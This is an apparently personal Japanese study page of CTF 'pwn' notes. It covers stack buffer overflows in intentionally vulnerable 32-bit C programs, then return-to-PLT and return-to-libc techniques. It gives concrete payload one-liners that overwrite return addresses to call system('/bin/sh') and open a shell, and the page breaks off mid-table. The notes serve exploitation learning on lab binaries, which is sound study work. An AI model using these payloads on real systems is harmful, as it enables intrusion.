<!DOCTYPE html>
<html lang="ja">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ハリネズミ本 pwnのめも | Note</title>
    <meta name="description" content="はりねずみめも">
    
    
    <link rel="preload" href="/note/assets/css/0.styles.6ac3a915.css" as="style"><link rel="preload" href="/note/assets/js/app.5b9b2271.js" as="script"><link rel="preload" href="/note/assets/js/2.a525c827.js" as="script"><link rel="preload" href="/note/assets/js/39.939de333.js" as="script"><link rel="prefetch" href="/note/assets/js/10.7b805608.js"><link rel="prefetch" href="/note/assets/js/11.363068c7.js"><link rel="prefetch" href="/note/assets/js/12.2603bafe.js"><link rel="prefetch" href="/note/assets/js/13.a5192383.js"><link rel="prefetch" href="/note/assets/js/14.1f0c3217.js"><link rel="prefetch" href="/note/assets/js/15.6460ebc6.js"><link rel="prefetch" href="/note/assets/js/16.c466de14.js"><link rel="prefetch" href="/note/assets/js/17.700cf1ca.js"><link rel="prefetch" href="/note/assets/js/18.f63cfc9c.js"><link rel="prefetch" href="/note/assets/js/19.648d2b77.js"><link rel="prefetch" href="/note/assets/js/20.feab0711.js"><link rel="prefetch" href="/note/assets/js/21.76fea801.js"><link rel="prefetch" href="/note/assets/js/22.dfd595c2.js"><link rel="prefetch" href="/note/assets/js/23.94b32aaa.js"><link rel="prefetch" href="/note/assets/js/24.9a90b78f.js"><link rel="prefetch" href="/note/assets/js/25.a00c4f56.js"><link rel="prefetch" href="/note/assets/js/26.cd9953dc.js"><link rel="prefetch" href="/note/assets/js/27.d78d9bcd.js"><link rel="prefetch" href="/note/assets/js/28.9ec71909.js"><link rel="prefetch" href="/note/assets/js/29.66a5093e.js"><link rel="prefetch" href="/note/assets/js/3.1c7a6bc6.js"><link rel="prefetch" href="/note/assets/js/30.858c01e0.js"><link rel="prefetch" href="/note/assets/js/31.82e6c4c3.js"><link rel="prefetch" href="/note/assets/js/32.bd4272bc.js"><link rel="prefetch" href="/note/assets/js/33.49a9a29c.js"><link rel="prefetch" href="/note/assets/js/34.53d3cb5d.js"><link rel="prefetch" href="/note/assets/js/35.62ce8672.js"><link rel="prefetch" href="/note/assets/js/36.9c0cc97f.js"><link rel="prefetch" href="/note/assets/js/37.aae46dc9.js"><link rel="prefetch" href="/note/assets/js/38.137dadaa.js"><link rel="prefetch" href="/note/assets/js/4.24c816f7.js"><link rel="prefetch" href="/note/assets/js/40.7e31ad2a.js"><link rel="prefetch" href="/note/assets/js/41.82cf25a0.js"><link rel="prefetch" href="/note/assets/js/42.cbbfa251.js"><link rel="prefetch" href="/note/assets/js/43.bb06c288.js"><link rel="prefetch" href="/note/assets/js/44.bc0323ec.js"><link rel="prefetch" href="/note/assets/js/45.d8f3eb58.js"><link rel="prefetch" href="/note/assets/js/46.2bd232c9.js"><link rel="prefetch" href="/note/assets/js/47.09a2ea9a.js"><link rel="prefetch" href="/note/assets/js/48.289b811b.js"><link rel="prefetch" href="/note/assets/js/49.5514c887.js"><link rel="prefetch" href="/note/assets/js/5.294a3154.js"><link rel="prefetch" href="/note/assets/js/50.bbf52ae9.js"><link rel="prefetch" href="/note/assets/js/51.7ebb19cb.js"><link rel="prefetch" href="/note/assets/js/52.3a5d44d3.js"><link rel="prefetch" href="/note/assets/js/53.e5e25356.js"><link rel="prefetch" href="/note/assets/js/54.1cc7352b.js"><link rel="prefetch" href="/note/assets/js/55.e47f03da.js"><link rel="prefetch" href="/note/assets/js/56.e89b41cb.js"><link rel="prefetch" href="/note/assets/js/57.f2d90be7.js"><link rel="prefetch" href="/note/assets/js/58.b912a1ae.js"><link rel="prefetch" href="/note/assets/js/59.08ef0cab.js"><link rel="prefetch" href="/note/assets/js/6.91363e5a.js"><link rel="prefetch" href="/note/assets/js/60.49540b0f.js"><link rel="prefetch" href="/note/assets/js/61.ea2a9571.js"><link rel="prefetch" href="/note/assets/js/62.26420654.js"><link rel="prefetch" href="/note/assets/js/63.366dd638.js"><link rel="prefetch" href="/note/assets/js/64.ba5d91eb.js"><link rel="prefetch" href="/note/assets/js/65.89b63a4b.js"><link rel="prefetch" href="/note/assets/js/66.98fd5458.js"><link rel="prefetch" href="/note/assets/js/67.0571d6f8.js"><link rel="prefetch" href="/note/assets/js/68.6916f912.js"><link rel="prefetch" href="/note/assets/js/69.e900e84a.js"><link rel="prefetch" href="/note/assets/js/7.520b95b6.js"><link rel="prefetch" href="/note/assets/js/70.67e1053f.js"><link rel="prefetch" href="/note/assets/js/71.4affc0c7.js"><link rel="prefetch" href="/note/assets/js/72.480ce966.js"><link rel="prefetch" href="/note/assets/js/73.d1fae1a7.js"><link rel="prefetch" href="/note/assets/js/74.98e6edec.js"><link rel="prefetch" href="/note/assets/js/8.585af4b3.js"><link rel="prefetch" href="/note/assets/js/9.c4655e14.js">
    <link rel="stylesheet" href="/note/assets/css/0.styles.6ac3a915.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/note/" class="home-link router-link-active"><!----> <span class="site-name">Note</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/note/about.html" class="nav-link">About</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/note/about.html" class="nav-link">About</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>ハリネズミ本 pwnのめも</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/note/article/ctf_cwn_notes.html#gdb-peda" class="sidebar-link">GDB(peda)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#objdump" class="sidebar-link">objdump</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#ローカル変数の破壊" class="sidebar-link">ローカル変数の破壊</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#bofを活用した-任意の数字の書き換え" class="sidebar-link">bofを活用した, 任意の数字の書き換え</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#pythonでの-xの書き込み" class="sidebar-link">pythonでの\xの書き込み</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#return-to-plt" class="sidebar-link">return to PLT</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/ctf_cwn_notes.html#仕組み" class="sidebar-link">仕組み</a></li><li class="sidebar-sub-header"><a href="/note/article/ctf_cwn_notes.html#攻撃コード" class="sidebar-link">攻撃コード</a></li></ul></li><li><a href="/note/article/ctf_cwn_notes.html#return-to-libc" class="sidebar-link">Return to libc</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/ctf_cwn_notes.html#仕組み-2" class="sidebar-link">仕組み</a></li><li class="sidebar-sub-header"><a href="/note/article/ctf_cwn_notes.html#攻撃方法の検討" class="sidebar-link">攻撃方法の検討</a></li></ul></li><li><a href="/note/article/ctf_cwn_notes.html#popret-gadget" class="sidebar-link">popret gadget</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/ctf_cwn_notes.html#概要" class="sidebar-link">概要</a></li></ul></li><li><a href="/note/article/ctf_cwn_notes.html#rop-return-oriented-programing" class="sidebar-link">ROP(Return Oriented Programing)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#任意のアドレスからの読み込み" class="sidebar-link">任意のアドレスからの読み込み</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#自由な書き込み" class="sidebar-link">自由な書き込み</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#got-overwrite" class="sidebar-link">GOT Overwrite</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/ctf_cwn_notes.html#what-s-got" class="sidebar-link">What's GOT?</a></li><li class="sidebar-sub-header"><a href="/note/article/ctf_cwn_notes.html#攻撃手法の策定" class="sidebar-link">攻撃手法の策定</a></li></ul></li><li><a href="/note/article/ctf_cwn_notes.html#攻撃手法のまとめ" class="sidebar-link">攻撃手法のまとめ</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/note/article/ctf_cwn_notes.html#aslrの回避" class="sidebar-link">ASLRの回避</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="ハリネズミ本-pwnのめも"><a href="#ハリネズミ本-pwnのめも" aria-hidden="true" class="header-anchor">#</a> ハリネズミ本 pwnのめも</h1> <h1 id="実行環境"><a href="#実行環境" aria-hidden="true" class="header-anchor">#</a> 実行環境</h1> <p>OSはUbuntu-18.04 LTSを使用しています。</p> <div class="language- extra-class"><pre class="language-text"><code>$ cat /etc/os-release 
NAME=&quot;Ubuntu&quot;
VERSION=&quot;18.04.2 LTS (Bionic Beaver)&quot;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&quot;Ubuntu 18.04.2 LTS&quot;
VERSION_ID=&quot;18.04&quot;
HOME_URL=&quot;https://www.ubuntu.com/&quot;
SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;
BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;
PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
</code></pre></div><h1 id="使用するツール"><a href="#使用するツール" aria-hidden="true" class="header-anchor">#</a> 使用するツール</h1> <h2 id="gdb-peda"><a href="#gdb-peda" aria-hidden="true" class="header-anchor">#</a> GDB(peda)</h2> <p>GDBはCLIベースのデバッガです。
GDBにより, 実行ファイルがオーバーフローを起こした時に, 実行ファイルが停止した位置やその時の変数の値などを知ることができます。
また, pedaという拡張スクリプトを追加することで,
EBXやEIPなどの情報や関数のアドレスを取得することができます。
非常に便利なので, インストールすることをおすすめします。</p> <h2 id="objdump"><a href="#objdump" aria-hidden="true" class="header-anchor">#</a> objdump</h2> <p>objdumpはCUIベースの逆アセンブラです。
実行ファイルを解析して, アセンブリコードを出力してくれます。</p> <p>さて, 前置きはこのくらいにして実際に問題を見ていきましょう。</p> <h1 id="stack-base-buffer-overflow"><a href="#stack-base-buffer-overflow" aria-hidden="true" class="header-anchor">#</a> stack base buffer overflow</h1> <h2 id="ローカル変数の破壊"><a href="#ローカル変数の破壊" aria-hidden="true" class="header-anchor">#</a> ローカル変数の破壊</h2> <div class="language-cpp extra-class"><pre class="language-cpp"><code><span class="token comment">// bof1.c</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">int</span> zero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;zero = %d\n&quot;</span><span class="token punctuation">,</span> zero<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>上のコードを32bit向け, SSP(stack smash protection)無効でコンパイルする.
この後, <code>AAAAAAAAAAAAAAAAAAAA</code>のような文字列を与えることでbuffer overflowを意図的に引き起こす。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ gcc -m32 -fno-stack-protector ./bof1 ./bof1.c
$ ./bof1
buffer address  <span class="token operator">=</span> ffffd062
zero address    <span class="token operator">=</span> ffffd06c
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zero <span class="token operator">=</span> <span class="token number">1094795585</span>
Segmentation fault <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span>
</code></pre></div><p>ここで, buffer addressが<code>ffffd062</code>で, zero addressが<code>ffffd06c</code>なのは,
main関数の中で順番に変数がstackに積まれて行くから(<code>ffffd062</code> + <code>10</code> = <code>ffffd06c</code>)。</p> <p>実行結果が, <code>1094795585</code>となっているのは, <code>AAAA</code>=<code>0x41414141</code> = <code>1094795585</code>だから。</p> <p>これを用いて, 任意の値を<code>zero</code>に代入してみる。</p> <h2 id="bofを活用した-任意の数字の書き換え"><a href="#bofを活用した-任意の数字の書き換え" aria-hidden="true" class="header-anchor">#</a> bofを活用した, 任意の数字の書き換え</h2> <div class="language-cpp extra-class"><pre class="language-cpp"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">int</span> zero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer address\t= %x\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;zero address\t= %x\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>zero<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;zero = %d\n&quot;</span><span class="token punctuation">,</span> zero<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>zero <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;congrats!\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>これも, 先ほどと同様に, SSP無効でコンパイル。
この後, bufferの10バイト文を適当な文字で埋めてから, 0x12345678で埋める。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ gcc -m32 -fno-stack-protector -o ./bof2 ./bof2.c
$ <span class="token builtin class-name">echo</span> -e <span class="token string">'AAAAAAAAAA<span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\x12">\x12</span>'</span> <span class="token operator">|</span> ./bof2
buffer address                         <span class="token operator">=</span> ffffd062
zero address                           <span class="token operator">=</span> ffffd06c
zero <span class="token operator">=</span> <span class="token number">12345678</span>
congrats<span class="token operator">!</span>
Segmentation fault <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span>
</code></pre></div><p>はい, おk。
ここで, リトルエンディアン形式であることに注意。</p> <p><code>$ echo -e 'AAAAAAAAAA\x78\x56\x34\x12' | ./bof2</code>
について, <code>-e</code>オプションは<code>\x</code>表記を認めるというオプション。
リトルエンディアン形式なので, <code>\x78\x56\x34\x12</code>という表記になっている。</p> <h1 id="bofを活用した-リターンアドレスの書き換え"><a href="#bofを活用した-リターンアドレスの書き換え" aria-hidden="true" class="header-anchor">#</a> bofを活用した, リターンアドレスの書き換え</h1> <div class="language-c extra-class"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">char</span> local<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer address\t= %x\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;local address\t= %x\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer: 0x%x\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>local<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> local<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>このままだと, EIPを奪取できない(コンパイラが防いでいるらしい)
<a href="https://hiziriai.hatenablog.com/entry/2017/05/17/234505" target="_blank" rel="noopener noreferrer">詳しくはこの記事で<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h2 id="pythonでの-xの書き込み"><a href="#pythonでの-xの書き込み" aria-hidden="true" class="header-anchor">#</a> pythonでの\xの書き込み</h2> <div class="language-bash extra-class"><pre class="language-bash"><code>$ python -c <span class="token string">'import sys; sys.stdout.buffer.write(b&quot;A&quot; * 16 +  b&quot;<span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xc0">\xc0</span>&quot;)'</span>
</code></pre></div><p>のように書くと,</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'AAAAAAAAAAAAAAAA<span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xc0">\xc0</span>'</span>
</code></pre></div><p>と同じ意味になる。</p> <p>main 630 56555630?
printf 410 56555554?</p> <p><a href="http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/" target="_blank" rel="noopener noreferrer">神記事<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>system: 0xf7 e1 62 00
引数</p> <div class="language- extra-class"><pre class="language-text"><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char buffer[32];

void func(){
    char local[32];
  fgets(local, 128, stdin);
  strcpy(buffer, local);
}

int main(){
  printf(&quot;buffer: 0x%x\n&quot;, &amp;buffer);
  func();
}

</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>$ (echo -e 'r\n/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x62\xe1\xf7\xf1\x84\x04\x08\x60\xa0\x04\x08';cat) | gdb -q ./ret2libc 
</code></pre></div><h2 id="return-to-plt"><a href="#return-to-plt" aria-hidden="true" class="header-anchor">#</a> return to PLT</h2> <h3 id="仕組み"><a href="#仕組み" aria-hidden="true" class="header-anchor">#</a> 仕組み</h3> <p>printf@pltを呼び出す。
printfを引数込みで呼び出す。</p> <p>ret命令の挙動は, (1)現在のeipをpopして(2)そのeipのアドレスにjumpするというもの。</p> <p>call命令は, (1)スタックにリターンアドレスを積んでから(引数も積む)(2)jumpを行うというもの。</p> <p>したがって, ret命令でcall命令を再現するには, (1)スタックにリターンアドレスを積んでおけばおk(引数も積む)。</p> <h3 id="攻撃コード"><a href="#攻撃コード" aria-hidden="true" class="header-anchor">#</a> 攻撃コード</h3> <table><thead><tr><th style="text-align:center;">内容</th> <th style="text-align:center;">アドレス</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;">下位アドレス</td> <td style="text-align:center;">0x00000000</td> <td style="text-align:center;">...</td></tr> <tr><td style="text-align:center;">...</td> <td style="text-align:center;">...</td> <td style="text-align:center;">...</td></tr> <tr><td style="text-align:center;">関数のアドレス=リターンアドレス</td> <td style="text-align:center;">0x08048340</td> <td style="text-align:center;">printf@plt</td></tr> <tr><td style="text-align:center;">printf呼び出し後のリターンアドレス</td> <td style="text-align:center;">BBBB</td> <td style="text-align:center;">ダミー</td></tr> <tr><td style="text-align:center;">printfの引数(buffer)</td> <td style="text-align:center;">0x0804a040</td> <td style="text-align:center;">bufferの中身を表示したいので</td></tr> <tr><td style="text-align:center;">上位アドレス</td> <td style="text-align:center;">0xffffffff</td> <td style="text-align:center;"></td></tr></tbody></table> <p>gdbでpattern_createおよびpattoをかけて, EIPに設定されるのが44文字目以降であることを確認。</p> <p>以上の順にEIPを埋めていけば良いため, 攻撃コードの概要は以下のようになる。
<code>A*44文字 + \x40\x83\x04\x08 + BBBB + \x40\xa0\x04\x08</code></p> <p>したがって, 攻撃コードは以下の通り。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ python -c <span class="token string">'import sys; sys.stdout.buffer.write(b&quot;A&quot;*44 + b&quot;<span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>&quot; + b&quot;BBBB&quot; + b&quot;<span class="token entity" title="\x40">\x40</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>&quot;)'</span> <span class="token operator">|</span> ./plt
</code></pre></div><p>と思いきや, 実行がうまくいきません。</p> <p>調べてみると, リターンアドレスがダミーだとprintf関数が正しく実行されないようです(printf関数のret時にreturnアドレスが正しくないとSegmentationFaultになるらしい)
http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/</p> <h2 id="return-to-libc"><a href="#return-to-libc" aria-hidden="true" class="header-anchor">#</a> Return to libc</h2> <h3 id="仕組み-2"><a href="#仕組み-2" aria-hidden="true" class="header-anchor">#</a> 仕組み</h3> <p>return to PLTではprintf関数を呼び出しましたが, 次はsystem関数を実行してみましょう。</p> <p>system関数の実行では, /bin/sh(bash)を実行することとします。なぜなら, shellを奪えればその後はコマンドを叩いて大抵のことはできるようになるからです。</p> <h3 id="攻撃方法の検討"><a href="#攻撃方法の検討" aria-hidden="true" class="header-anchor">#</a> 攻撃方法の検討</h3> <p>まず, system関数の場所を確認します。
main関数にbreakpointを立ててrunし, p systemで確認できます。</p> <p>すると, 以下のように表示されるのでsystem関数は<code>0xf7e16200</code>にあることがわかります。</p> <div class="language- extra-class"><pre class="language-text"><code>$1 = {&lt;text variable, no debug info&gt;} 0xf7e16200 &lt;system&gt;
</code></pre></div><p>さらに, system関数は第一引数に文字列を指定する必要があるため, とりあえずbuffer変数のアドレス(0x0804a060)を指定します。</p> <p>すると, 以下のようなスタックの状況を作れれば攻撃が成功しそうです。</p> <table><thead><tr><th style="text-align:center;">内容</th> <th style="text-align:center;">アドレス</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;">下位のアドレス</td> <td style="text-align:center;">0x00000000</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">...</td> <td style="text-align:center;">...</td> <td style="text-align:center;">...</td></tr> <tr><td style="text-align:center;">関数アドレス=リターンアドレス</td> <td style="text-align:center;">0xf7e16200</td> <td style="text-align:center;">今回はsystem関数の場所</td></tr> <tr><td style="text-align:center;">関数呼び出し後のリターンアドレス</td> <td style="text-align:center;">BBBB</td> <td style="text-align:center;">ダミー(あとでprintfと同じようにmain関数の番地にするかも)</td></tr> <tr><td style="text-align:center;">引数1</td> <td style="text-align:center;">0x0804a060</td> <td style="text-align:center;">buffer変数の番地</td></tr> <tr><td style="text-align:center;">...</td> <td style="text-align:center;">...</td> <td style="text-align:center;">...</td></tr> <tr><td style="text-align:center;">上位アドレス</td> <td style="text-align:center;">0xffffffff</td> <td style="text-align:center;">...</td></tr></tbody></table> <p>したがって、攻撃文字列は以下のようになります。
<code>/bin/sh(7文字) + \x00(1文字) + A*(44-7-2＝36文字) + \x00\x62\xe1\xf7 + BBBB + \x60\xa0\x04\x08</code></p> <p>echoでかくと, 以下のようになる。</p> <div class="language- extra-class"><pre class="language-text"><code>(echo -e '/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x62\xe1\xf7\x39\x85\x04\x08\x60\xa0\x04\x08'; cat) | ./bof
</code></pre></div><p>pythonでかくと, 以下のようになる(echoの時は挿入されている\n(改行コード)がないため, \nを挿入している)。</p> <div class="language- extra-class"><pre class="language-text"><code>(python -c 'import sys; sys.stdout.buffer.write(b&quot;/bin/sh&quot; + b&quot;\x00&quot; + b&quot;A&quot;*36 + b&quot;\x00\x62\xe1\xf7&quot; + b&quot;\x39\x85\x04\x08&quot; + b&quot;\x60\xa0\x04\x08\n&quot;)'; cat;) | ./bof
</code></pre></div><h2 id="popret-gadget"><a href="#popret-gadget" aria-hidden="true" class="header-anchor">#</a> popret gadget</h2> <h3 id="概要"><a href="#概要" aria-hidden="true" class="header-anchor">#</a> 概要</h3> <p>先程までの例では, main関数のリターンアドレスとしてmain関数のアドレスを利用していた。
しかし, このリターンアドレスに他の関数のリターンアドレスを埋め込んでおけば2つめの関数を呼び出すことが可能になる。</p> <p>しかし、以下のように、単純に関数を設定するだけだとスタックの中身が散乱してしまう。</p> <table><thead><tr><th style="text-align:center;">SP</th> <th style="text-align:center;">内容</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;"></td> <td style="text-align:center;">下位のアドレス</td> <td style="text-align:center;">0x00000000</td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数1のアドレス</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数1のリターンアドレス</td> <td style="text-align:center;">関数2のアドレスを入れる</td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数1の引数1</td> <td style="text-align:center;">関数2のリターンアドレスを入れる</td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数1の引数2</td> <td style="text-align:center;">関数2の引数1を入れる</td></tr> <tr><td style="text-align:center;"></td> <td 